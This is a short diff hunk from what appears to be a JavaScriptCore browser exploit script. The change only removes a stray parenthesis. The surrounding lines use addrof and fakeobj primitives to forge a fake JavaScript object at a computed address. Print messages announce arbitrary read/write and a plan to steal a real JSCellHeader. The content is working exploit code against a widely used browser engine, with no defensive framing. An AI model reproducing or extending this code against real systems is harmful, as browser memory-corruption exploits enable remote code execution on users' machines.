@@ -524,7 +524,7 @@ for (var i = 0; i < 1000; ++i) {
 
     print("outer @ " + new Int64(addrof(container)+0x10));
 
-    var hax = fakeobj(addrof(container) + 0x10));
+    var hax = fakeobj(addrof(container) + 0x10);
     print("we have hax object ;)");
     print("after further work we can use this object for arbitrary r/w");
     print("now lets steal a real JSCellHeader")
